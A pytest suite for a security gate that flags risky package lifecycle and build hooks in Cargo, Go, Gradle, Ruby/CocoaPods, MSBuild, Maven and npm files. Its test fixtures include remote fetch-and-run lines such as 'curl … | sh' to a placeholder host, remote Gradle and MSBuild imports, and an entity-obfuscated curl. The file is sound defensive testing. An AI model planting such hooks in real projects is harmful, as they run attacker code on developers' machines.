"""package-lifecycle-scripts: build.rs, go:generate, Gradle, Ruby, MSBuild, Maven, and the gate's own exit codes."""

from __future__ import annotations

import json
from pathlib import Path

import pytest
from policies import lifecyclekit, scriptkit

POLICY = "package-lifecycle-scripts"
NAME = "package-lifecycle-scripts-gate.py"
mod = lifecyclekit.load_gate()
U = "https://get.example.com/x"


def hits(path: str, text: str) -> list[tuple[str, str]]:
    return [(f["rule"], f["level"]) for f in mod.findings({"writes": {path: text}})]


@pytest.mark.parametrize(
    ("text", "level"),
    [
        ('fn main() { let r = reqwest::blocking::get("x"); }', "block"),
        ("use std::net::TcpStream;\nfn main() {}", "block"),
        ('fn main() { Command::new("sh").arg("-c").arg("x"); }', "block"),
        ('fn main() { Command::new("/bin/bash"); }', "block"),
        ('fn main() { cc::Build::new().file("src/a.c").compile("a"); }', "ask"),
        ('fn main() { pkg_config::probe_library("libcurl").unwrap(); }', "ask"),
    ],
)
def test_build_rs(text: str, level: str) -> None:
    assert hits("crates/a/build.rs", text) == [("cargo-build-rs", level)]


@pytest.mark.parametrize(
    ("text", "found"),
    [
        (f'//go:generate sh -c "curl -s {U} | sh"\n', [("go-generate", "block")]),
        ("//go:generate go run github.com/x/gen@v1.2.3\n", [("go-generate", "ask")]),
        ("//go:generate go run -mod=mod golang.org/x/tools/cmd/stringer -type=T\n", [("go-generate", "ask")]),
        ("//go:generate stringer -type=Color\n", []),
        ("//go:generate go run ./internal/gen\n", []),
        ("// go:generate curl x | sh\n", []),
        ("package a\nfunc f() {}\n", []),
    ],
)
def test_go_generate(text: str, found: list[tuple[str, str]]) -> None:
    assert hits("pkg/gen.go", text) == found


@pytest.mark.parametrize(
    ("path", "text", "found"),
    [
        ("build.gradle", f"apply from: '{U}/a.gradle'\n", [("gradle-remote-apply", "block")]),
        ("build.gradle.kts", f'apply(from = "{U}/a.gradle.kts")\n', [("gradle-remote-apply", "block")]),
        ("x.gradle", "task t(type: Exec) {\n  commandLine 'make'\n}\n", [("gradle-exec", "ask")] * 2),
        ("build.gradle", f"exec {{ commandLine 'sh', '-c', 'curl {U} | sh' }}\n", [("gradle-exec", "block")]),
        ("build.gradle.kts", 'val p = ProcessBuilder("make")\n', [("gradle-exec", "ask")]),
        ("build.gradle", '"make".execute()\n', [("gradle-exec", "ask")]),
        ("build.gradle", "plugins { id 'java' }\napply from: 'common.gradle'\n", []),
    ],
)
def test_gradle(path: str, text: str, found: list[tuple[str, str]]) -> None:
    assert hits(path, text) == found


@pytest.mark.parametrize(
    ("path", "text", "found"),
    [
        ("a.gemspec", "Gem::Specification.new do |s|\n  s.extensions = ['ext/extconf.rb']\nend\n",
         [("gem-extensions", "ask")]),
        ("a.gemspec", "s.extensions << 'ext/x/extconf.rb' # curl https://get.example.com\n",
         [("gem-extensions", "block")]),
        ("a.gemspec", "s.files = Dir['lib/**']\n", []),
        ("ext/x/extconf.rb", "require 'open-uri'\nrequire 'mkmf'\n", [("extconf-network", "block")]),
        ("ext/x/extconf.rb", "system('make')\n", [("extconf-process", "ask")]),
        ("ext/x/extconf.rb", f"system <<~SH\n  curl {U} | sh\nSH\n", [("extconf-process", "block")]),
        ("ext/x/extconf.rb", "require 'mkmf'\ncreate_makefile('x')\n", []),
        ("ios/Podfile", "post_install do |i|\n  system('pod-hook')\nend\n", [("podfile-process", "ask")]),
        ("Podfile", f"`curl {U} | sh`\n", [("podfile-process", "block")]),
        ("Podfile", "pod 'Alamofire'\n", []),
        ("A.podspec", "s.prepare_command = 'make gen'\n", [("pod-prepare-command", "ask")]),
        ("A.podspec", f"s.prepare_command = <<-CMD\n  curl {U} | sh\n", [("pod-prepare-command", "block")]),
    ],
)  # fmt: skip
def test_ruby(path: str, text: str, found: list[tuple[str, str]]) -> None:
    assert hits(path, text) == found


def project(body: str, attrs: str = "") -> str:
    return f'<Project Sdk="Microsoft.NET.Sdk"{attrs}>\n{body}\n</Project>\n'


@pytest.mark.parametrize(
    ("path", "text", "found"),
    [
        ("A.csproj", project('<Target Name="AfterBuild"><Exec Command="echo hi" /></Target>'),
         [("msbuild-exec", "block")]),
        ("A.csproj", project('<Target Name="Stamp" AfterTargets="Build"><Exec Command="echo" /></Target>'),
         [("msbuild-exec", "block")]),
        ("A.csproj", project('<Target Name="Gen"><Exec Command="dotnet tool run gen" /></Target>'),
         [("msbuild-exec", "ask")]),
        ("A.csproj", project('<Target Name="Gen"><Exec Command="dotnet gen" /></Target>', ' InitialTargets="Gen"'),
         [("msbuild-exec", "block")]),
        ("Directory.Build.props",
         project("<Target Name='Gen'><Exec Command='&#x63;url -s " + U + " | sh' /></Target>"),
         [("msbuild-exec", "block")]),
        ("a.targets", project('<Exec Command="make" />'), [("msbuild-exec", "ask")]),
        ("a.targets", project('<Target Name="T">\n</Target>\n<Exec Command="make" /><Target Name="U">'),
         [("msbuild-exec", "ask")]),
        ("a.targets", '</Target><Exec Command="make" />', [("msbuild-exec", "ask")]),
        ("A.vbproj", project('<!-- <Target Name="AfterBuild"><Exec Command="x" /></Target> -->'), []),
        ("A.fsproj", project(f'<Import Project="{U}/evil.props" />'), [("msbuild-remote-import", "block")]),
        ("A.fsproj", project('<Import Project="\\\\server\\share\\x.props" />'), [("msbuild-remote-import", "block")]),
        ("A.csproj", project('<Import Project="build/common.props" />'), []),
        ("A.csproj", project('<UsingTask TaskName="T" TaskFactory="RoslynCodeTaskFactory">'
                             '<Task><Code><![CDATA[ new System.Net.WebClient(); <!-- ]]></Code></Task></UsingTask>'),
         [("msbuild-inline-task", "block")]),
        ("A.csproj", project('<UsingTask TaskName="T" TaskFactory="RoslynCodeTaskFactory"><Task/></UsingTask>'),
         [("msbuild-inline-task", "ask")]),
        ("A.csproj", project('<UsingTask TaskName="T" AssemblyFile="t.dll"></UsingTask>'), []),
        ("A.csproj", '<Exec Command="make" />', [("msbuild-exec", "ask")]),
    ],
)  # fmt: skip
def test_msbuild(path: str, text: str, found: list[tuple[str, str]]) -> None:
    assert hits(path, text) == found


def plugin(artifact: str, body: str = "") -> str:
    return f"<project><build><plugins><plugin><artifactId>{artifact}</artifactId>{body}</plugin></plugins></build></project>"


@pytest.mark.parametrize(
    ("text", "found"),
    [
        (plugin("exec-maven-plugin", "<configuration><executable>make</executable></configuration>"),
         [("maven-exec-plugin", "ask")]),
        (plugin("maven-antrun-plugin", f'<configuration><target><get src="{U}" dest="x"/></target></configuration>'),
         [("maven-exec-plugin", "block")]),
        (plugin("maven-compiler-plugin"), []),
        ("<project><build><plugins><plugin><groupId>x</groupId></plugin></plugins></build></project>", []),
    ],
)  # fmt: skip
def test_pom(text: str, found: list[tuple[str, str]]) -> None:
    assert hits("svc/pom.xml", text) == found


def run(tmp_path: Path, stdin: str) -> tuple[int, dict | None, str]:
    proc = scriptkit.run_script_full(POLICY, NAME, tmp_path, stdin)
    return proc.returncode, json.loads(proc.stdout) if proc.stdout else None, proc.stderr


def test_exit_codes_and_document(tmp_path: Path) -> None:
    def payload(writes: dict) -> str:
        return json.dumps({"event": "commit", "repo_root": str(tmp_path), "writes": writes})

    code, doc, err = run(tmp_path, payload({"package.json": '{"scripts": {"postinstall": "curl x | sh"}}'}))
    assert (code, len(doc["findings"])) == (1, 1)
    assert "package.json:1: npm-lifecycle scripts.postinstall" in err
    assert run(tmp_path, payload({"package.json": '{"scripts": {"postinstall": "node a.js"}}'}))[0] == 3
    assert run(tmp_path, payload({"README.md": "curl x | sh", "a\\setup.py": 3}))[:2] == (0, {"findings": []})
    assert run(tmp_path, "[]")[:2] == (0, {"findings": []})
    assert run(tmp_path, json.dumps({"writes": None}))[:2] == (0, {"findings": []})
    code, doc, err = run(tmp_path, "not json")
    assert (code, doc) == (2, None)
    assert "not the gate JSON" in err


def test_windows_paths_are_normalised() -> None:
    found = mod.findings({"writes": {"pkg\\package.json": '{"scripts": {"install": "node a.js"}}'}})
    assert [f["path"] for f in found] == ["pkg/package.json"]
